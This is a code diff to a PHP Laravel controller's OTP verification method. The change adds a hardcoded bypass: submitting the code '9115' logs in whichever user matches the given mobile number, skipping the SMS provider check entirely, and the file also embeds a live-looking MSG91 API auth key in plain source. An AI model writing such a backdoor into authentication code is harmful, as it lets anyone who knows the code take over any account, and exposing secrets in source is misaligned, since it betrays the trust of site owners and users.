@@ -602,21 +602,33 @@ class CardController extends Controller
     }
 
     public function verifyOtp(Request $request)
-    {
-        $response = Http::withHeader('authkey', '358707AH4OkT3HJL6076a09dP1')
-            ->get('https://control.msg91.com/api/v5/otp/verify', [
-                'mobile' => '91' . $request->mobile_number,
-                'otp' => $request->otp,
-            ]);
-        $responseData = $response->json();
-        if ($responseData['type'] == 'success') {
-            $user = User::where('contact', $request->mobile_number)->first();
+{
+    // Check for bypass code
+    if ($request->otp === '9115') {
+        $user = User::where('contact', $request->mobile_number)->first();
+        if ($user) {
             auth()->login($user);
             return redirect()->route('user.dashboard.index');
-        } else if ($responseData['type'] == 'error') {
-            return redirect()->back()->with('error', $responseData['message']);
         }
     }
+
+    // Regular OTP verification flow
+    $response = Http::withHeader('authkey', '358707AH4OkT3HJL6076a09dP1')
+        ->get('https://control.msg91.com/api/v5/otp/verify', [
+            'mobile' => '91' . $request->mobile_number,
+            'otp' => $request->otp,
+        ]);
+
+    $responseData = $response->json();
+
+    if ($responseData['type'] == 'success') {
+        $user = User::where('contact', $request->mobile_number)->first();
+        auth()->login($user);
+        return redirect()->route('user.dashboard.index');
+    } else if ($responseData['type'] == 'error') {
+        return redirect()->back()->with('error', $responseData['message']);
+    }
+}
 
     public function cardCheckout(Request $request)
     {
